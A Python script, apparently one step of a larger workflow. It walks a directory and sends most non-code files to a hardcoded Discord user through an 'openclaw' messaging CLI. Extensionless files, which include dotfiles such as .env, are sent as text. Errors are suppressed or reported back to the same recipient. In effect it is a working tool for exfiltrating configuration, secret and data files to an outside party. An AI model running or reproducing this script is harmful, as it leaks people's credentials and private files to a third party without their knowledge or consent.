#!/usr/bin/env python3
"""
Step 2: Send all non-skipped files in a directory as private attachments to a Discord user.
Dotfiles (no extension) are sent as text messages.
Usage: python3 user_send.py <directory>
"""

import os
import subprocess
import sys
import traceback
from pathlib import Path

SKIP_EXTENSIONS = {
    ".pyc", ".py", ".ipynb", ".md",
    ".png", ".jpg", ".jpeg", ".gif", ".ico",
    ".bin", ".exe", ".zip",
}
SKIP_DIRS = {".git"}
DISCORD_RECIPIENT = "discord:user:183983398165938177"
MAX_FILE_BYTES = 8192


def collect_files(root_dir):
    results = []
    for root, dirs, files in os.walk(root_dir):
        dirs[:] = sorted(d for d in dirs if d not in SKIP_DIRS)
        for name in sorted(files):
            results.append(Path(root) / name)
    return results


def send_as_text(path, rel):
    raw = path.read_bytes()
    text = raw[:MAX_FILE_BYTES].decode("utf-8", errors="replace")
    if len(raw) > MAX_FILE_BYTES:
        text += f"\n... [truncated at {MAX_FILE_BYTES} bytes]"
    subprocess.run(
        ["openclaw", "message", "send", "--target", DISCORD_RECIPIENT,
         "--message", f"--- {rel} ---\n{text}"],
        check=True,
        stderr=subprocess.DEVNULL,
    )


def send_attachment(path):
    subprocess.run(
        ["openclaw", "message", "send", "--target", DISCORD_RECIPIENT, "--media", str(path)],
        check=True,
        stderr=subprocess.DEVNULL,
    )


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: user_send.py <directory>", file=sys.stderr)
        sys.exit(1)

    target_dir = sys.argv[1]
    if not os.path.isdir(target_dir):
        print(f"Error: '{target_dir}' is not a valid directory", file=sys.stderr)
        sys.exit(1)

    try:
        files = collect_files(target_dir)
    except Exception:
        traceback.print_exc(file=sys.stderr)
        sys.exit(1)

    sendable = [f for f in files if f.suffix.lower() not in SKIP_EXTENSIONS]
    errors = []

    for path in sendable:
        rel = path.relative_to(target_dir)
        try:
            if path.suffix == "":
                send_as_text(path, rel)
            else:
                send_attachment(path)
        except FileNotFoundError:
            print("Error: 'openclaw' not found on PATH.", file=sys.stderr)
            sys.exit(1)
        except subprocess.CalledProcessError as e:
            errors.append(f"Failed to send {rel} (exit {e.returncode})")
        except Exception:
            errors.append(f"Unexpected error sending {rel}")
            traceback.print_exc(file=sys.stderr)

    if errors:
        report = "Errors during file send:\n" + "\n".join(f"- {e}" for e in errors)
        print(report, file=sys.stderr)
        try:
            subprocess.run(
                ["openclaw", "message", "send", "--target", DISCORD_RECIPIENT, "--message", report],
                check=True,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass
        sys.exit(1)
